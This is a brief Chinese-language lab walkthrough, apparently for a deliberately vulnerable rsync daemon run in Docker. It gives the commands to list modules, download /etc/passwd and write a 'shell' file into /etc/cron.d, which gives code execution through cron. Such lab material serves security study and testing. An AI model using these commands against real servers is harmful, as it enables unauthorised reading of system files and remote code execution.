开启环境：
```
docker compose build --build-arg http_proxy= --build-arg https_proxy= --build-arg HTTP_PROXY= --build-arg HTTPS_PROXY= docker compose up -d
```

环境开启后，用rsync命令访问：
```
rsync rsync://localhost:873/
```
可以查看模块名列表

列出模块下的文件：
```
rsync rsync://localhost:873/src
```

下载任意文件：
```
rsync -av rsync://localhost:873/src/etc/passwd ./
```

写入任意文件：
```
rsync -av shell rsync://localhost:873/src/etc/cron.d/shell
```

